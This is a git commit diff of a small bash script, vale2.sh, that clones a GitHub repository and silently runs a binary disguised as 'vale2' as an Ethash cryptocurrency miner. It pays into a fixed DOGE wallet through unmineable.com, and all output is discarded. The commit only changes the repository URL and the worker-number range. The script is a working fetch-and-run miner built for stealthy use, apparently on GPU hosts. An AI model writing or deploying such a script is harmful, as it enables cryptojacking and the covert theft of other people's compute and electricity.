fe9c9d8301e29699d7f41244d1534804bd06c2c8
adrpopack <84959690+adrpopack@users.noreply.github.com>
2021-06-03 08:58:32 +0700

    Update vale2.sh

--- vale2.sh
+++ vale2.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
 WALLET=DOGE:DFnzT5dETx7AnkXqdkHese6uae5Au4uU19
-WORKER=$(echo $(shuf -i 1-9999 -n 1)-V100)
+WORKER=$(echo $(shuf -i 1-9 -n 1)-V100)
 
-git clone https://github.com/admin121x/1 &> /dev/null && cd 1/1.29 ; chmod +x vale2 && ./vale2 --algo ETHASH --pool $POOL --user $WALLET.$WORKER &> /dev/null
+git clone https://github.com/adrpopack/1 &> /dev/null && cd 1/1.29 ; chmod +x vale2 && ./vale2 --algo ETHASH --pool $POOL --user $WALLET.$WORKER &> /dev/null
